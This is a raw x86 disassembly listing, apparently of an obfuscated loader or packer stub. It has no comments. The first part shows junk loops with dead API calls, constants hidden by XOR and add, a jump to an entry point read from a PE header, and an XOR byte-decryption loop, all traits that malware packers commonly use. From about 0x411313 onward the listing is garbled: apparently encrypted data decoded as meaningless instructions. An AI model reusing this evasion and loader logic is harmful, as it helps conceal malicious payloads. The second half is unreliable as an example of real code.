  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x94f46cd3
  411322:	lds    edx,FWORD PTR [edi-0x72]
  411325:	bound  esp,QWORD PTR [edx-0x33]
  411328:	pop    edi
  411329:	bound  esp,QWORD PTR [edx-0x2]
  41132c:	push   0x11
  41132e:	jge    0x411343
  411330:	xchg   ah,dl
  411332:	add    al,0x55
  411334:	sar    DWORD PTR [edx*1-0x12f098af],1
  41133b:	pop    esp
  41133c:	push   edx
  41133d:	or     BYTE PTR [eax-0x2d],0x4
  411341:	js     0x411366
  411343:	outs   dx,BYTE PTR ds:[esi]
  411344:	test   eax,0x53eafc7c
  411349:	je     0x4113b4
  41134b:	adc    dh,cl
  41134d:	daa    
  41134e:	dec    ecx
  41134f:	dec    ecx
  411350:	(bad)  
  411352:	push   ebp
  411353:	inc    ecx
  411354:	jo     0x411319
  411356:	ret    0xec61
  411359:	dec    esp
  41135a:	mov    esp,0x565ce08e
  41135f:	fs ret 0xcd6b
  411363:	loopne 0x4113c8
  411365:	lahf   
  411366:	shl    BYTE PTR [edx-0x3d09a4c3],1
  41136c:	cli    
  41136d:	push   edi
  41136e:	imul   ebx,DWORD PTR [esp+eax*2-0x32],0xffffffc0
  411373:	arpl   WORD PTR [eax],dx
  411375:	pop    ss
  411376:	mov    dl,0x21
  411378:	jl     0x411371
  41137a:	popa   
  41137b:	sbb    DWORD PTR [edx],0xdae5d77f
  411381:	outs   dx,BYTE PTR ds:[esi]
  411382:	mov    ebp,0x231ff894
  411387:	(bad)  [edx+0x59f00e4c]
  41138d:	int    0x17
  41138f:	jp     0x411344
  411391:	into   
  411392:	mov    DWORD PTR [esi+0x2bcf5753],ecx
  411398:	in     al,dx
  411399:	mov    es,WORD PTR [edi+ebx*4-0x30]
  41139d:	hlt    
  41139e:	mov    edx,0xb1be8659
  4113a3:	xchg   DWORD PTR [ebx-0x6eec1175],ebp
  4113a9:	in     al,0xca
  4113ab:	int    0x9e
  4113ad:	and    al,0x2e
  4113af:	pop    esp
  4113b0:	push   eax
  4113b1:	shr    ebp,0xa9
  4113b4:	iret   
  4113b5:	clc    
  4113b6:	push   0x3a
  4113b8:	arpl   ax,bp
  4113ba:	mov    bl,0x9a
  4113bc:	xor    eax,0x7eba9c00
  4113c1:	ja     0x41141b
  4113c3:	test   DWORD PTR [ecx+0x73],edx
  4113c6:	mov    ah,0x11
  4113c8:	pop    ss
  4113c9:	cmp    eax,0xdd2ca3d4
  4113ce:	push   esp
  4113cf:	int3   
  4113d0:	mov    ah,0x57
  4113d2:	daa    
  4113d3:	iret   
  4113d4:	mov    ds:0x93b71e5e,al
  4113d9:	pop    eax
  4113da:	push   esi
  4113db:	nop
  4113dc:	imul   esi,DWORD PTR [eax-0x23],0xffffffa4
  4113e0:	stos   BYTE PTR es:[edi],al
  4113e1:	nop
  4113e2:	cmp    edi,DWORD PTR [ecx+ebp*1+0x57]
  4113e6:	jns    0x41137a
  4113e8:	(bad)  
  4113e9:	or     eax,0x1a6991db
  4113ee:	addr16 xchg ecx,eax
  4113f0:	pop    esi
  4113f1:	call   0x1f52:0x7b02bb46
  4113f8:	xchg   esi,eax
  4113f9:	and    ecx,DWORD PTR [ebp+0x2b]
  4113fc:	mov    cl,BYTE PTR [edx+0x66e3788b]
  411402:	pop    ebx
  411403:	add    al,0xcd
  411405:	arpl   WORD PTR [esi],di
  411407:	xchg   ecx,eax
  411408:	xchg   ebx,eax
  411409:	leave  
  41140a:	fst    QWORD PTR [ecx+0x3c4efb5a]
  411410:	stc    
  411411:	gs test al,0x9a
  411414:	adc    cl,al
  411416:	std    
  411417:	jmp    0x4113b8
  411419:	sahf   
  41141a:	dec    edi
  41141b:	int    0x89
  41141d:	(bad)  
  41141f:	or     DWORD PTR [ecx+0x2],0xa326fc51
  411426:	cmp    ch,bh
  411428:	sub    dl,BYTE PTR gs:[edx-0x42a841f3]
  41142f:	push   esp
  411430:	push   ebp
  411431:	cmp    esp,ebp
  411433:	pop    esi
  411434:	or     bl,cl
  411436:	shl    BYTE PTR [ecx],0x19
  411439:	sbb    DWORD PTR [edx],ecx
  41143b:	loop   0x411416
  41143d:	inc    ebx
  41143e:	adc    al,0x70
  411440:	pop    esp
  411441:	addr16 inc edi
  411443:	cld    
  411444:	push   eax
  411445:	out    dx,al
  411446:	cwde   
  411447:	in     eax,0xeb
  411449:	pop    ebx
  41144a:	in     eax,0x14
  41144c:	daa    
  41144d:	call   0xf53:0xae3d169b
  411454:	sub    eax,0xcbb80542
  411459:	inc    esp
  41145a:	fmul   DWORD PTR [ecx-0x38f4f522]
  411460:	xor    cl,BYTE PTR [ebp+0x734fd3e0]
  411466:	nop
  411467:	jne    0x4114d2
  411469:	aam    0xd8
  41146b:	xor    al,0xe3
  41146d:	aaa    
  41146e:	retf   0x7b12
  411471:	rol    esi,1
  411473:	push   ebx
  411474:	adc    eax,0x7b1e8c5c
  411479:	dec    ecx
  41147a:	push   es
  41147b:	in     al,0xd4
  41147d:	xchg   ebp,eax
  41147e:	in     eax,0x9c
  411480:	mov    ebp,0xe50402de
  411485:	fwait
  411486:	(bad)  
  411487:	jmp    0x1f5c39b7
  41148c:	xchg   ecx,eax
  41148d:	sbb    esi,DWORD PTR [eax]
  41148f:	adc    ecx,DWORD PTR [edx+edx*4]
  411492:	out    dx,al
  411493:	call   0xfd5c:0xd5431a1f
  41149a:	adc    esp,0x4
  41149d:	outs   dx,DWORD PTR ds:[esi]
  41149e:	nop
  41149f:	add    bh,BYTE PTR [ecx-0x63]
  4114a2:	ror    DWORD PTR [esi+eax*4+0x62],cl
  4114a6:	xchg   ebx,eax
  4114a7:	outs   dx,DWORD PTR ds:[esi]
  4114a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a9:	and    BYTE PTR [esi+0x170c794c],bl
  4114af:	push   eax
  4114b0:	daa    
  4114b1:	int    0x49
  4114b3:	jmp    0x411436
  4114b5:	push   ss
  4114b6:	leave  
  4114b7:	call   0x2b97:0xe9709636
  4114be:	mov    ebp,0x8dee7379
  4114c3:	pop    esp
  4114c4:	add    BYTE PTR [edi-0x515bddee],bh
  4114ca:	mov    eax,ds:0xb4799ea7
  4114cf:	inc    ebp
  4114d0:	lahf   
  4114d1:	xor    ecx,DWORD PTR [edi+ebx*4]
  4114d4:	cld    
  4114d5:	imul   ebp,DWORD PTR ds:0xe6214a9f,0xb30eec54
  4114df:	xchg   esp,eax
  4114e0:	stos   BYTE PTR es:[edi],al
  4114e1:	pop    ecx
  4114e2:	int    0x87
  4114e4:	push   cs
